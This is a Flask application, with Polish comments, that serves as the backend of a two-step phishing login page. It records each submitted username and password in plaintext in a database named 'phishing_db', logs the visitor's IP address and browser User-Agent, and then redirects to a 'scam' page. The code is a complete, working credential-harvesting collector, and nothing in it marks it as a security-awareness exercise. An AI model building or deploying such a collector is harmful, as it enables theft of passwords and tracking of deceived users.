from flask import Flask, render_template, request, redirect, url_for, session
import pyodbc

app = Flask(__name__)
app.secret_key = 'tajny_klucz'  # Potrzebny do przechowywania loginu w sesji

# Konfiguracja MSSQL
conn = pyodbc.connect(
    r'DRIVER={SQL Server};'
    r'SERVER=DAWIDEK\SQLEXPRESS;'
    r'DATABASE=phishing_db;'
    r'Trusted_Connection=yes;'
)
cursor = conn.cursor()

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    login = request.form['login']

    # Sprawdzenie, czy login już istnieje w bazie
    cursor.execute("SELECT id FROM users WHERE login = ?", (login,))
    user = cursor.fetchone()

    if user:
        user_id = user[0]
    else:
        cursor.execute("INSERT INTO users (login) OUTPUT INSERTED.id VALUES (?)", (login,))
        user_id = cursor.fetchone()[0]
        conn.commit()

    # Zapisanie user_id w sesji, aby przekazać do /password
    session['user_id'] = user_id

    return redirect(url_for('password_page'))

@app.route('/password')
def password_page():
    if 'user_id' not in session:
        return redirect(url_for('index'))  # Jeśli ktoś wejdzie na /password bez loginu

    return render_template('password.html')

@app.route('/submit_password', methods=['POST'])
def submit_password():
    if 'user_id' not in session:
        return redirect(url_for('index'))

    password = request.form['password']
    user_id = session['user_id']

    # Pobranie IP i User-Agent
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    # Zapisanie hasła
    cursor.execute("INSERT INTO passwords (user_id, password) VALUES (?, ?)", (user_id, password))
    conn.commit()

    # Zapisanie logów
    cursor.execute("INSERT INTO logs (user_id, ip_address, user_agent) VALUES (?, ?, ?)", 
                   (user_id, ip_address, user_agent))
    conn.commit()

    # Wyczyść sesję po zapisaniu danych
    session.pop('user_id', None)

    return redirect(url_for('scam'))

@app.route('/scam')
def scam():
    return render_template('scam.html')

if __name__ == '__main__':
    app.run(debug=True)
